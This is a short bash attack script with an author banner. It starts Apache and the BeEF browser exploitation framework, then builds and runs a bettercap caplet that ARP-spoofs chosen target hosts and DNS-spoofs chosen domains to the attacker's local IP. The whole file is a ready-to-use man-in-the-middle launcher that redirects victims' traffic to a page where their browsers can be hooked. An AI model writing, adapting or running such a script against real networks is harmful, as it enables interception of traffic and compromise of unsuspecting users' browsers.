echo "
  ▄█   ▄█▄    ▄████████  ▄█    ▄▄▄▄███▄▄▄▄      ▄███████▄ 
  ███ ▄███▀   ███    ███ ███  ▄██▀▀▀███▀▀▀██▄   ███    ███ 
  ███▐██▀     ███    ███ ███▌ ███   ███   ███   ███    ███ 
 ▄█████▀     ▄███▄▄▄▄██▀ ███▌ ███   ███   ███   ███    ███ 
▀▀█████▄    ▀▀███▀▀▀▀▀   ███▌ ███   ███   ███ ▀█████████▀  
  ███▐██▄   ▀███████████ ███  ███   ███   ███   ███        
  ███ ▀███▄   ███    ███ ███  ███   ███   ███   ███        
  ███   ▀█▀   ███    ███ █▀    ▀█   ███   █▀   ▄████▀      
  ▀           ███    ███                                   

  		   Made By SysGerm @ CCS
"

# Gets local ip
localip=$(ifconfig | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep -v '[127.0|172.17].0.1' | awk '{ print $2 }' | cut -f2 -d: | head -n1)

# Starts apache 2
service apache2 start

echo "[-] Apache Server Running"

# Opens a terminal for beef
gnome-terminal -e 'sh -c "cd ~/Downloads/git/beef/; sudo ./beef; exec bash"' &> /dev/null

echo "[-] Beef Running"

# Makes a custom caplet
cd ~/go/bin
echo "net.probe on" > custom.cap;
echo "set dns.spoof.address $localip" >> custom.cap;
echo "set dns.spoof.domains $1" >> custom.cap;
echo "dns.spoof on" >> custom.cap;
echo "set arp.spoof.targets $2" >> custom.cap;
echo "arp.spoof on" >> custom.cap;

#Opens a terminal for bettercap and opens a custom caplet
gnome-terminal -e 'sh -c "cd ~/go/bin/; sudo ./bettercap -caplet custom.cap; exec bash;"' &> /dev/null

echo "[-] Bettercap Running"
